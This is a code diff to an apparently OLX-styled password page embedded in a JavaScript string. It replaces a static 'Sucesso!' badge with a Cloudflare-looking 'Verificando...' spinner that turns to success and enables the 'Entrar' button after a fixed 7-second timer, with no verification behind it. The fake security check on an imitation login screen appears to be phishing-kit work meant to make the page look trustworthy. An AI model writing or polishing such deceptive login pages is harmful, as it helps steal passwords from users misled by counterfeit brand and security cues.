@@ -142,10 +142,13 @@ const PASSWORD_SCREEN_HTML = `<!DOCTYPE html>
   .cf-right span{font-size:9px;color:#999;line-height:1}
   .btn-entrar{display:block;width:100%;padding:18px;border:0;border-radius:9999px;background:#f48120;color:#fff;font:inherit;font-size:18px;font-weight:700;text-align:center;cursor:pointer;transition:opacity .15s}
   .btn-entrar:hover{opacity:.9}
+  .btn-entrar:disabled,.btn-entrar[disabled]{background:#d0d0d0;color:#fff;cursor:not-allowed;opacity:1}
+  .btn-entrar:disabled:hover,.btn-entrar[disabled]:hover{opacity:1}
   .links{display:flex;justify-content:space-between;align-items:center;margin:20px 0 0;padding:0}
   .links a,.links button{background:none;border:0;color:#6E0AD6;font:inherit;font-size:16px;font-weight:600;cursor:pointer;text-decoration:none;padding:0}
   .links a:hover,.links button:hover{text-decoration:underline}
   @keyframes olxSpin{to{transform:rotate(360deg)}}
+  .cf-spinner{width:22px;height:22px;border:3px solid #e5e7eb;border-top-color:#f48120;border-radius:50%;animation:olxSpin .8s linear infinite;flex-shrink:0}
 </style>
 </head>
 <body>
@@ -180,9 +183,10 @@ const PASSWORD_SCREEN_HTML = `<!DOCTYPE html>
     </div>
 
     <div class="cf-box">
-      <div class="cf-left">
-        <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#16a34a"/><polyline points="7 12.5 10.5 16 17 9" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        <span>Sucesso!</span>
+      <div class="cf-left" id="cf-left">
+        <div class="cf-spinner" id="cf-spinner"></div>
+        <svg id="cf-check" style="display:none" width="24" height="24" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#16a34a"/><polyline points="7 12.5 10.5 16 17 9" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        <span id="cf-text">Verificando...</span>
       </div>
       <div class="cf-right">
         <svg width="34" height="14" viewBox="0 0 88 36" xmlns="http://www.w3.org/2000/svg">
@@ -193,7 +197,7 @@ const PASSWORD_SCREEN_HTML = `<!DOCTYPE html>
       </div>
     </div>
 
-    <button type="button" class="btn-entrar" id="btn-entrar">Entrar</button>
+    <button type="button" class="btn-entrar" id="btn-entrar" disabled aria-disabled="true">Entrar</button>
 
     <div class="links">
       <button type="button" class="back-btn" data-action="back">Voltar</button>
@@ -203,6 +207,20 @@ const PASSWORD_SCREEN_HTML = `<!DOCTYPE html>
 
   <script>
     (function(){
+      var entrarBtnInit = document.getElementById('btn-entrar');
+      var cfSpinner = document.getElementById('cf-spinner');
+      var cfCheck = document.getElementById('cf-check');
+      var cfText = document.getElementById('cf-text');
+      setTimeout(function(){
+        if(cfSpinner) cfSpinner.style.display = 'none';
+        if(cfCheck) cfCheck.style.display = '';
+        if(cfText) cfText.textContent = 'Sucesso!';
+        if(entrarBtnInit){
+          entrarBtnInit.disabled = false;
+          entrarBtnInit.removeAttribute('aria-disabled');
+        }
+      }, 7000);
+
       var pwInput = document.getElementById('pw-input');
       var toggleBtn = document.getElementById('toggle-pw-btn');
       var slash = document.getElementById('pw-slash');
